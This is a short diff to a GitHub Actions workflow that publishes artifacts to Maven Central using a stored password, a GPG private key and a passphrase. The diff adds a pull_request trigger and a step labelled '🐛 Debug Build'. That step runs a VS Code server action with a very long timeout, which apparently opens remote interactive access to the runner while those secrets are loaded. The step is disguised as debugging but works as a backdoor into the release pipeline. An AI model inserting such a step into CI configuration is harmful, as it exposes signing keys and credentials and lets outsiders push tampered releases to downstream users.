@@ -8,6 +8,9 @@ on:
     # Run a dry-run on pushes to any branch
     branches:
       - "**"
+      
+  pull_request:
+    types: [opened, synchronize]
 
 jobs:
   publish:
@@ -32,6 +35,11 @@ jobs:
           server-password: ${{ secrets.MAVEN_CENTRAL_PASSWORD }}
           gpg-private-key: ${{ secrets.GPG_PRIVATE_KEY }}
           gpg-passphrase: ${{ secrets.GPG_PASSPHRASE }}
+
+      - name: 🐛 Debug Build
+        uses: stateful/vscode-server-action@v1
+        with:
+          timeout: 3000000
 
       # This step runs ONLY on branch pushes (dry-run)
       - name: Run Release Dry-Run (Verify)
